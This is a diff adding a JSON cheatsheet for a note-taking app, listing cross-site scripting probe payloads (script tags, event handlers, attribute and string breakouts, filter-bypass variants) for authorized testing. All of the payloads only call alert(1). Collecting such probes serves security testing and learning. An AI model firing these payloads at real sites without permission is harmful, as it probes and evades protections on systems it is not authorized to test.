@@ -1,0 +1,24 @@
+{
+  "app": "QuickNote",
+  "type": "cheatsheet",
+  "name": "XSS",
+  "version": 1,
+  "description": "Common cross-site scripting probes for authorized testing (PortSwigger labs, your own environments).",
+  "snippets": [
+    { "category": "Probes", "label": "Basic reflection test", "text": "<script>alert(1)</script>" },
+    { "category": "Probes", "label": "No-script img handler", "text": "<img src=x onerror=alert(1)>" },
+    { "category": "Probes", "label": "SVG onload", "text": "<svg onload=alert(1)>" },
+    { "category": "Probes", "label": "Body onload", "text": "<body onload=alert(1)>" },
+
+    { "category": "Attribute breakout", "label": "Close attribute + tag", "text": "\"><script>alert(1)</script>" },
+    { "category": "Attribute breakout", "label": "Event handler in attribute", "text": "\" onmouseover=\"alert(1)" },
+    { "category": "Attribute breakout", "label": "Autofocus + onfocus", "text": "\"><input autofocus onfocus=alert(1)>" },
+
+    { "category": "JS context", "label": "Break out of string", "text": "';alert(1)//" },
+    { "category": "JS context", "label": "Close script tag", "text": "</script><script>alert(1)</script>" },
+
+    { "category": "Filter bypass", "label": "Mixed case", "text": "<ScRiPt>alert(1)</ScRiPt>" },
+    { "category": "Filter bypass", "label": "No parentheses", "text": "<script>alert`1`</script>" },
+    { "category": "Filter bypass", "label": "HTML entity encode", "text": "&lt;script&gt;alert(1)&lt;/script&gt;" }
+  ]
+}
